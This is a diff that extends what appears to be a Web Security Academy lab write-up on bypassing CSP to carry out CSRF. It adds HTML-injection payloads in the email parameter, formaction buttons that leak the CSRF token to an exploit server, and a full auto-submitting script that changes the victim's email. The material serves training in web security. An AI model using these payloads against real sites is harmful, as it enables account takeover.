@@ -332,3 +332,59 @@ https://...web-security-academy.net/my-account?email=AUBFSI
 window.location="https://...web-security-academy.net/my-account?email=hacker@evil-user.net"><button type="submit">Click me</button><img src=""
 </script>
 ```
+or
+- Change the payload to **foo@example.com"><img src= onerror=alert(1)>** - that will bypass client verification but 
+  not CSP
+- **https://YOUR-LAB-ID.web-security-academy.net/my-account?email=<img src onerror=alert(1)>** - payload is reflected on 
+  the page, but the code doesn't run, look at DevTools: the inline script was blocked due to the CSP
+- notice that **form-action** directive is missing
+- try
+```html
+https://YOUR-LAB-ID.web-security-academy.net/my-account?email=foo@bar"><button formaction="https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit">Click me</button>
+```
+- get CSRF using GET method:
+```html
+https://YOUR-LAB-ID.web-security-academy.net/my-account?email=foo@bar"><button formaction="https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit" formmethod="get">Click me</button>
+```
+- create for exploit server:
+```html
+<body>
+<script>
+// Define the URLs for the lab environment and the exploit server.
+const academyFrontend = "https://your-lab-url.net/";
+const exploitServer = "https://your-exploit-server.net/exploit";
+
+// Extract the CSRF token from the URL.
+const url = new URL(location);
+const csrf = url.searchParams.get('csrf');
+
+// Check if a CSRF token was found in the URL.
+if (csrf) {
+    // If a CSRF token is present, create dynamic form elements to perform the attack.
+    const form = document.createElement('form');
+    const email = document.createElement('input');
+    const token = document.createElement('input');
+
+    // Set the name and value of the CSRF token input to utilize the extracted token for bypassing security measures.
+    token.name = 'csrf';
+    token.value = csrf;
+
+    // Configure the new email address intended to replace the user's current email.
+    email.name = 'email';
+    email.value = 'hacker@evil-user.net';
+
+    // Set the form attributes, append the form to the document, and configure it to automatically submit.
+    form.method = 'post';
+    form.action = `${academyFrontend}my-account/change-email`;
+    form.append(email);
+    form.append(token);
+    document.documentElement.append(form);
+    form.submit();
+
+    // If no CSRF token is present, redirect the browser to a crafted URL that embeds a clickable button designed to expose or generate a CSRF token by making the user trigger a GET request
+} else {
+    location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
+}
+</script>
+</body>
+```
